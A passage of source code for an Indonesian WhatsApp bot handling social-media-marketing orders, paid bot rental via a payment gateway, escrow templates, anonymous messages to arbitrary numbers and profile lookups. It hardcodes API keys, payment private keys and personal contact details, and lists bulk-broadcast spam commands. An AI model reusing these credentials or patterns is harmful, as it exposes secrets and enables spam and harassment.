  reply(`\n\nPermasalahan :\n${result.data.message} `)
} else {
	let successMessage = `*──••• 「 STATUS TRANSAKSI 」 •••──*

_🆔Tujuan: ${result.data.target}_
_✨ Hrga : ${result.data.price}_
_🧾 Waktu : ${result.data.start_count}_
_📝 Jumblah  : ${result.data.remains}_
_🔢 Status_ : ${result.data.status}
`;

       Biiofc.sendMessage(msg.chat, {text:successMessage})
}
}
break
case 'smmlist':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let md5 = require('md5')
        let smmkey = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let data = {
          api_key: smmkey,        }
        fetch(`https://mrxpanel.com/api/services`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
var teks = '*List Layanan*\n\n'
let GG = 0
for (let x of data.data){
teks +=`🆔 id: ${x.id}\n🧨Nama : ${x.name}\n🛒 Kategori : ${x.category}\n💸Price : Rp${x.price}\n📔Deks : ${x.description}\n🦕Type : ${x.type}\n🎈Min Order : ${x.min}\n🌼Max Order : ${x.max}\n Stok : ${x.status}\n\n`
}
reply(teks)
})
}
break
case "deposit-smm":
case "smm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
	if (!isOwner) throw ('Minimal deposit Rp200000')
      let apikeysmm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));;
    let data = {
        api_key: apikeysmm,
    };
    let response = await fetch('https://mrxpanel.com/api/services', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
	      if (result.status == false) {
  reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${result.data.message} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
	let successMessage = `LIST

📝 ID : _${result.data.id}_

*_UNTUK MELIHAT TRX ID SILHAKAN KETIK trx!!._*`;

   Biiofc.sendMessage(m.chat, {text:successMessage})
}}
break
case 'listdaftar':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let xx_us = JSON.parse(fs.readFileSync("./freya/user.json"));
let no = 1
let teks_db =`*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )`
for (let x of xx_us){
teks_db +=`*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Premium: ${x.premium? 'aktif':'tidak'}*\n\n`
}
reply(teks_db)
}
break
case 'daftar':{
 if (cekUser("id", sender) !== null) return reply('ʟᴜ ᴏʟᴀɴɢ sᴇʙᴇʟᴜᴍɴʏᴀ ᴜᴅʜ ᴛᴇʀᴅᴀғᴛᴀʀ... ʜᴀʏᴀᴀᴀ')
var res_us = `${makeid(10)}`
var user_name = `#GR${makeid(5)}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false }
db_user.push(object_user)
fs.writeFileSync('./freya/user.json', JSON.stringify(db_user, 2, null))
reply(`sᴜᴋsᴇs, ᴀɴᴅᴀ sᴇᴋᴀʀᴀɴɢ ᴛᴇʟᴀʜ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ sɪsᴛᴇᴍ ʙᴏᴛ @${sender.split("@")[0]}`, [sender])
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${sender.split('@')[0]}
○ Name : ${pushname}
○ Seri : ${res_us}

sɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ .ᴍᴇɴᴜ ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ
ʙᴏᴛ ɪɴɪ ғʀᴇᴇ, ᴀᴅᴀ ʙᴇʙᴇʀᴀᴘᴀ ғɪᴛᴜʀ ᴋʜᴜsᴜs ᴘʀᴇᴍɪᴜᴍ
ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ᴘʀᴇᴍɪᴜᴍ/ᴏᴡɴᴇʀ
sɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ʜᴀʀᴅᴢsᴇɴᴘᴀɪɪ ( ᴏᴡɴᴇʀ ᴜᴛᴀᴍᴀ )
sᴇʙᴇʟᴜᴍɴʏᴀ ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sʜɪɴᴢᴜ ʙᴏᴛ
`
Biiofc.sendMessage(from, {text : verify_teks}, {quoted: hw})
}
break
case "pushkontakmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*


𖣂 *P U S H K O N - M E N U*

々 ${prefix}ᴄᴇᴋɪᴅɢᴄ
々 ${prefix}ʟɪsᴛɢʀᴏᴜᴘ
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ1 *ɪᴅɢᴄ|ᴛᴇxᴛ*
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ2 *ᴛᴇxᴛ*
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ3 *ɪᴅɢʀᴏᴜ|ᴊᴇᴅᴀ|ᴛᴇxᴛ*
々 ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ4 *ᴊᴇᴅᴀ|ᴛᴇxᴛ*
々 ${prefix}sᴀᴠsᴄᴏɴᴛᴀᴄᴛv1 *ɪᴅɢʀᴏᴜᴘ*
々 ${prefix}sᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2 *ᴛᴇxᴛ*
々 ${prefix}sᴀᴠᴇᴋᴏɴᴛᴀᴋ *ᴛᴇxᴛ*
々 ${prefix}ɢᴇᴛᴄᴏɴᴛᴀᴄᴛ *ᴛᴇxᴛ*
々 ${prefix}sᴇɴᴅᴋᴏɴᴛᴀᴋ *ᴛᴇxᴛ*
々 ${prefix}ʙᴄᴠɪᴅᴇᴏ *ᴛᴇxᴛ*
々 ${prefix}ʙᴄɢᴄ *ᴛᴇxᴛ*
々 ${prefix}ʙᴄᴘᴏʟʟ *ᴛᴇxᴛ*
々 ${prefix}ᴊᴘᴍ *ᴛᴇxᴛ*
`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: '𝚂 𝙷 𝙸 𝙽 𝚉 𝚄  - 𝙼 𝙳',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio6.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case 'totalfitur':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`_Total Semua Fitur ${totalFitur()}_`)
        break
case "buyapipm2": {
  if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/apipm2.zip'), caption: 'Nih Yapit, Kau Jual Murah Awas Kontol', mimetype: 'application/zip', fileName: 'apipm2.zip'}, {quoted: m})
minSaldo(sender, 35000, db_saldo)
}
break
case "buyeggpm2": {
  if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
minSaldo(sender, 30000, db_saldo)
}
break
case "buycasepm2": {
  if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/caseaddpm2.zip'), caption: 'Nih Kontol, Kau Jual Murah Ku Delete!', mimetype: 'application/zip', fileName: 'caseaddpm2.zip'}, {quoted: m})
minSaldo(sender, 45000, db_saldo)
}
break
case 'public': {
if (!isOwner) return m.reply('*khusus Premium*') 
Biiofc.public = true
m.reply('Sukse Change To Public')
}
break
case 'self': {

if (!isOwner) return m.reply('*khusus Premium*')     
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
Biiofc.public = false
m.reply('Sukses Change To Self')
}
break
case 'buysewa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`¥ *Price Sewa Bot Hardz Offcial* €

🔏 3 hari = 15k
🔏 1 minggu = 25k
🔏 2 minggu = 35k
🔏 1 bulan = 50k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
break
case 'buysewainbot':{                       
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!isUrl(q) && !q.includes('whatsapp.com')) return reply(`Link Invalid`)
if(!q) return reply('example : sewa https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF|3day')
if(fs.existsSync(`./freya/sewa/${sender}.json`)) return reply(`Selesaikan pembelian anda sebelumnya`)
               let idproduk = q.split("|")
if (idproduk == "1day") {
global.nama = sewa.rizalxdzzdev1.nama;
global.idproduk = sewa.rizalxdzzdev1.id;
global.harga = sewa.rizalxdzzdev1.harga;
}
if (idproduk == "3day") {
global.nama = sewa.rizalxdzzdev2.nama;
global.idproduk = sewa.rizalxdzzdev2.id;
global.harga = sewa.rizalxdzzdev2.harga;
}
if (idproduk == "5day") {
global.nama = sewa.rizalxdzzdev3.nama;
global.idproduk = sewa.rizalxdzzdev3.id;
global.harga = sewa.rizalxdzzdev3.harga;
}
if (idproduk == "7day") {
global.nama = sewa.rizalxdzzdev4.nama;
global.idproduk = sewa.rizalxdzzdev4.id;
global.harga = sewa.rizalxdzzdev4.harga;
}
if (idproduk == "10day") {
global.nama = sewa.rizalxdzzdev5.nama;
global.idproduk = sewa.rizalxdzzdev5.id;
global.harga = sewa.rizalxdzzdev5.harga;
}
if (idproduk == "14day") {
global.nama = sewa.rizalxdzzdev6.nama;
global.idproduk = sewa.rizalxdzzdev6.id;
global.harga = sewa.rizalxdzzdev6.harga;
}
if (idproduk == "21day") {
global.nama = sewa.rizalxdzzdev7.nama;
global.idproduk = sewa.rizalxdzzdev7.id;
global.harga = sewa.rizalxdzzdev7.harga;
}
if (idproduk == "30day") {
global.nama = sewa.rizalxdzzdev8.nama;
global.idproduk = sewa.rizalxdzzdev8.id;
global.harga = sewa.rizalxdzzdev8.harga;
}
if (idproduk == "permanen") {
global.nama = sewa.rizalxdzzdev9.nama;
global.idproduk = sewa.rizalxdzzdev9.id;
global.harga = sewa.rizalxdzzdev9.harga;
}
const axios = require('axios');
const crypto = require('crypto');
const apiKey = "DEV-WOLUoq8TyMk6o1WYbzCTzbWLkQIBBRJO1TMA9bTO"
const privateKey = "ZEQbg-flMbR-z2jde-wfFeP-NveoC"
const merchant_code = "T25306"
const merchant_ref = 'INV' + randomNomor(1,999999);
const amount = global.harga
const signature = crypto.createHmac('sha256', privateKey).update(merchant_code + merchant_ref + amount).digest('hex');

const data = {
  'method': 'QRIS2',
  'merchant_ref': merchant_ref,
  'amount': amount,
  'customer_name': 'rizalxdzz',
  'customer_email': 'barruranreng@gmail.com',
  'order_items': [{
    'name': 'Bot whatsaap'+amount,
    'price': amount,
    'quantity': 1
  }],
  'return_url': `https://wa.me/6285279292140`,
  'signature': signature
}

axios.post('https://tripay.co.id/api/transaction/create', data, {
  headers: {
    'Authorization': 'Bearer ' + apiKey
  },
  validateStatus: function (status) {
    return status < 999;
  }
})
.then((res) => {	
	let messn = `*── 「 CHECK OUT 」 ──*

_Silahkan Scan Qris Ini Untuk Membayar:_
_》No Ref : ${res.data.data.reference}_
_》Harga : ${formatmoney(res.data.data.amount_received)}_
_》Fee : ${formatmoney(res.data.data.total_fee)}_
_》Total : ${formatmoney(res.data.data.amount)}_
_》Method : Qris Otomatis_
_》Status : ${res.data.data.status}_

Jika Anda Sudah Melakukan Pembayaran Silahkan ketik Konfirsewa no ref Bot Akan Secara Otomatis Masuk Group Tanpa Acc Owner!.`
Biiofc.sendMessage(sender, { caption: messn, image: { url: res.data.data.qr_url } })
let obj = { id: sender, ref: res.data.data.reference, status: res.data.data.status }
fs.writeFileSync(`./freya/sewa/${sender}.json`, JSON.stringify(obj))
    }) 
          
.catch((err) => {
reply(`proses membuat qris`)
}) 
break
}  
case 'konfirsewa':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (!text) return reply(`_Silahkan masukan No Ref_\n\n*_❗Contoh:.konfirsewa T16262662_*`)
   if(!fs.existsSync(`./freya/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')

const axios = require('axios');
const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
const apiKey = "9gsUxfRqcUS6f1OTXR0ueqZOj33e9YioeBQ1OEhK"
const privateKey = "spgut-dLZIP-aWBt7-edckK-usRyg"
const merchant_code = "T0001"
var reference = `${checkRefSewa(sender, deppo) ? checkRefSewa(sender, deppo) : args[2]}`
axios.get('https://tripay.co.id/api/transaction/detail?reference=' + text, {
  headers: { 'Authorization': 'Bearer ' + apiKey },
  validateStatus: function (status) {
    return status < 999;
  }
})
.then((res) => {
  if (res.data.success == true) {
    if (res.data.data.status == 'UNPAID') {
let abc = `kamu belum melakukan pembayaran`
Biiofc.sendMessage(from, {text:abc}, Biiofc.user.name, msg)
    } else if (res.data.data.status == 'PAID') {
    	 let brhsl= `*── 「 PEMBAYARAN BERHASIL 」 ──*

_Silahkan Scan Qris Ini Untuk Membayar:_
_》No Ref : ${res.data.data.reference}_
_》Harga : ${formatmoney(res.data.data.amount_received)}_
_》Fee : ${formatmoney(res.data.data.total_fee)}_
_》Total : ${formatmoney(res.data.data.amount)}_
_》Method : Qris Otomatis_
_》Status : ${res.data.data.status}_

Bot Akan Masuk Group Otomatis, Mungkin Membutuhkan Waktu Silahkan Tunggu Sebentar, Terimakasih!.`

Biiofc.sendMessage(msg.chat, {text:brhsl}, Biiofc.user.name, m)
let result = args[1].split('https://chat.whatsapp.com/')[1]
Biiofc.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      fs.unlinkSync(`./freya/sewa/${from}.json`)
    } else if (res.data.data.status == 'EXPIRED') {
      reply('pembayaran kadaluarsa ')
      fs.unlinkSync(`./freya/sewa/${from}.json`)
    }
  } else {
    reply(res.data.message)
  }
})
.catch((err) => {
  reply(err)
});
break
}            
case 'cancelsewa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if(!fs.existsSync(`./freya/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')
fs.unlinkSync(`./freya/sewa/${from}.json`)
        reply('Sukses')
break
case "formatpost": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `🥀FORMAT JASPOST BY ${namaCreator}🥀
(BUKAN AKUN MILIK ADMIN)
                   
JUAL AKUN :
SPEK :
HARGA:
MC :
NOMER : wa.me/


NOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN ${namaCreator} AGAR TERHINDAR DARI PENIPUAN


🥀BEE SMART BUYER🥀`
reply(text12)
}
break
case "formatneed": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `*FORMAT JASA NEED AKUN BY ${namaCreator}*
*( BUKAN AKUN ADMIN )*

NAMA PEMILIK : 
AKUN : 
LOGIN : 
HARGA : 
SPEK AKUN : 
MC : 
  
*#TIDAK MENERIMA KIRKON*

📝𝐍𝐎𝐓𝐄 : 
*WAJIB MENGGUNAKAN JASA ADMIN ${namaCreator} UNTUK MENGHINDARI PENIPUAN*

*PERINGATAN ⚠️*
*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*`
reply(text12)
}
break
case "feerekber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `FEE BER² ${namaCreator}

•0 - 99K ≠ 5K
•99K - 150K ≠ 10K
•151K - 200K ≠ 15K
•201K - 324K ≠ 20K
•325K - 400K ≠ 25K
•401K - 500K ≠ 30K
•501K - 599K ≠ 35K
•600K - 699K ≠ 40K
•700K - 799K ≠ 45K
•800K - 1JT ≠ 50K
•1,1JT - 1,7JT ≠ 70K
•1,8JT - 2,5JT ≠ 100K
•BTBER ≠ 50K 
•TTBEB ≠ 50K`
reply(text12)
}
break
case "formatpencairan": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `FORMAT PENCAIRAN ${namaCreator}

Pencarian : 
No pay    : 
Atas nama :

KESALAHAN PADA NOMOR PENCAIRAN BUKAN JADI TANGGUNG JAWAB KAMI TOLONG DI CEK DENGAN DETAIL DAN SEBENAR-BENARNYA AGAR TIDAK TERJADI KESALAHAN YANG TIDAK DI INGINKAN KESALAHAN PADA NOMOR PENCAIRAN KAMI TIDAK AKAN BERTANGGUNG JAWAB`
reply(text12)
}
break
case "allrec": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `REKAM LAYAR!

> HAPUS SEMUA PESAN GMAIL
> KOSONGKAN SEMUA SAMPAH GMAIL
> HAPUS AKUN FB DARI PERANGKAT
> LOGOUT FF

*BY* ${namaCreator}`
reply(text12)
}
break
case "danamasuk": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `DANA MASUK!

SILAHKAN SEND DATA SECARA PRIBADI KALO SUDAH DONE DAN DATA SUDAH DI AMANKAN SILAHKAN KETIK DONE KE GRUP BESERTA BUKTI SS LOGIN AKUN AGAR DANA BISA DI CAIRKAN KE PENJUAL UNTUK PENJUAL SILAHKAN KETIK .formatpencairan LALU ISI DENGAN BENAR AGAR KAMI TIDAK SALAH MENCAIRKAN DANA KESALAHAN DI TANGGUNG PENJUAL

X TRX BATAL FEE TETEP KEPOTONG X
BE SMART BUYER AND SELLER`
reply(text12)
}
break
case "donerekber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const text12 = `ALL TRX DONE ✅
 

   BUUYER : ✅
   SELLEER : ✅


NOTE ⛔ : JIKA ADA KENDALA DI LAIN WAKTU ADMIN SUDAH TIDAK BERTANGGUNG JAWAB ❗❗


TERIMA KASIH SUDAH BERBELANJA DI ${namaCreator}`
reply(text12)
}
break
case 'menfess':
case 'menfes':
case 'confes':
case 'confess':
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
let nomor = q.split('|')[0] ? q.split('|')[0] : q
let saking = q.split('|')[1] ? q.split('|')[1] : q
let pesan = q.split('|')[2] ? q.split('|')[2] : ''
if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
let teksnya = `Hai kk ada Menfess nih!!\n\nDari :  _${saking}_  \nPesan : _${pesan}_ `
header = 'hayyy'
gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`
Biiofc.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, footer: `𝚁𝙴𝚈𝚉\nhttps://wa.me/6282192773770` })
m.reply(`Sukses Mengirim Menfess!!`)     
break  
case 'menfesconfirm':
Biiofc.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🌹`})
m.reply(`Terimakasih Menfess Telah Diterima.`)
break
case 'cuaca':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
if (!q) throw `_Contoh_\n${prefix+command} palembang`
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*
*Nama:* ${cuaca.name + "," + cuaca.sys.country}
*Longitude:* ${cuaca.coord.lon}
*Latitude:* ${cuaca.coord.lat}
*Suhu:* ${cuaca.main.temp + " C"}
*Angin:* ${cuaca.wind.speed + " m/s"}
*Kelembaban:* ${cuaca.main.humidity + "%"}
*Cuaca:* ${cuaca.weather[0].main}
*Keterangan:* ${cuaca.weather[0].description}
*Udara:* ${cuaca.main.pressure + " HPa"}`
reply(text_cuaca)
break
case 'couple': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)  
await Biiofc
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Biiofc.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
Biiofc.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}
break
case 'stalktiktok':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)         
if (!isOwner) return reply(`Ngapain ? Khusus Hz Offcial Aja !!`)
await Biiofc
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
Biiofc.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break
case 'stalkig':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)  
if (args.length == 0) return reply(`Example: ${prefix + command} jessnolimit`)
axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Full Name : ${data.result.fullname}\n`
caption += `Posts : ${data.result.posts}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Following : ${data.result.following}\n`
caption += `Bio : ${data.result.bio}`
Biiofc.sendMessage(from, { image: { url: data.result.photo_profile }, caption })
})
}
break
case 'infogempa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
var caption = `Lokasi : ${data.result.lokasi}\n`
caption += `Waktu : ${data.result.waktu}\n`
caption += `Potensi : ${data.result.potensi}\n`
caption += `Magnitude : ${data.result.magnitude}\n`
caption += `Kedalaman : ${data.result.kedalaman}\n`
caption += `Koordinat : ${data.result.koordinat}`
Biiofc.sendMessage(from, { image: { url: data.result.map }, caption })
break
case 'jadwalsholat':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
await Biiofc
if (args.length == 0) return reply(`Example: ${prefix + command} Jakarta`)
axios
.get(`https://api.lolhuman.xyz/api/sholat/${args[0]}?apikey=${apikey}`)
.then(({ data }) => {
var text = `Wilayah : ${data.result.wilayah}\n`
text += `Tanggal : ${data.result.tanggal}\n`
text += `Sahur : ${data.result.sahur}\n`
text += `Imsak : ${data.result.imsak}\n`
text += `Subuh : ${data.result.subuh}\n`
text += `Terbit : ${data.result.terbit}\n`
